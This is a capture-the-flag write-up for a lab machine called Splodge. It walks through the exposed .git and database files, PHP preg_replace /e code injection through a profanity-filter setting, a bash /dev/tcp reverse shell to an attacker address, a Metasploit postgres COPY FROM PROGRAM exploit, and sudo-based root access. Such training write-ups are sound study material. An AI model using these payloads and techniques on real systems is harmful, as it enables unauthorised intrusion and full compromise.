# Splodge

### Enumeration

```
80/tcp   open  http       nginx 1.16.1
|_http-title: 403 Forbidden
| http-git: 
|   192.168.147.108:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     .gitignore matched patterns 'bug' 'key'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: initial commit 
|_    Project type: node.js application (guessed from .gitignore)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.16.1
```

```
http://192.168.147.108/.git/config

	name = The Splodge
	email = admin@splodge.offsec
```

Saved and edited contents of /.git/index to index.txt

GET /§§ HTTP/1.1 Intruder, Sniper Attack - index.txt

```
/database/.gitignore

In the response:
*.db
```

Blind guess.

```
http://192.168.147.108/database/splodge.db
splodge.db: SQLite 3.x database, last written using SQLite version 3008010
```

Opened it with SQLite Database Browser

| id | title    | filter | replacement   | password    |
| -- | -------- | ------ | ------------- | ----------- |
| 1  | Splodge  | /x/e   | system('id'); | \[REDACTED] |

| id | post\_id | author | message                                 |
| -- | -------- | ------ | --------------------------------------- |
| 2  | 1        | x      |  uid=0(root) gid=0(root) groups=0(root) |

/login -> admin:\[REDACTED]

Profanity Filter Regex -> /x/e

Profanity Replacement -> system('id');

Post a comment x:x&#x20;

In the response:

x: uid=997(nginx) gid=995(nginx) groups=995(nginx)

### Initial Access

Profanity Filter Regex -> /x/e

Profanity Replacement -> system('/bin/bash -i >& /dev/tcp/192.168.49.147/80 0>&1');

Post a comment x:x

### Lateral Movement

Enviroment Variables:

```
DB_HOST=127.0.0.1                                                                   
DB_PORT=5432
APP_NAME=Splodge
USER=nginx
APP_URL=http://splodge.offsec
PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
DB_CONNECTION=pgsql
DB_DATABASE=splodge
DB_PASSWORD=[REDACTED]
DB_USERNAME=postgres
HOME=/var/lib/nginx
```

```
$ ps aux | grep pgsql
thesplo+  1023  0.0  0.9 397396 17472 ?        Ss   18:26   0:00 /usr/pgsql-12/bin/postmaster -D /home/thesplodge/.pgdata
```

```
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > options 

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting     Required  Description
   ----               ---------------     --------  -----------
   DATABASE           template1           yes       The database to authenticate a
                                                    gainst
   DUMP_TABLE_OUTPUT  false               no        select payload command output
                                                    from table (For Debugging)
   PASSWORD           [REDACTED]          no        The password for the specified
                                                    username. Leave blank for a random
                                                    password.
   RHOSTS             192.168.147.108     yes       The target host(s), see https:
                                                    //github.com/rapid7/metasploit
                                                    -framework/wiki/Using-Metasploit
   RPORT              5432                yes       The target port (TCP)
   TABLENAME          imqV1ya2m           yes       A table name that does not exi
                                                    st (To avoid deletion)
   USERNAME           postgres            yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.147   yes       The listen address (an interface may be speci
                                     fied)
   LPORT  80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

### PrivEsc

```
[thesplodge@splodge ~]$ sudo -l
...
User thesplodge may run the following commands on splodge:
    (ALL) NOPASSWD: /bin/bash
    
[thesplodge@splodge ~]$ sudo /bin/bash
```
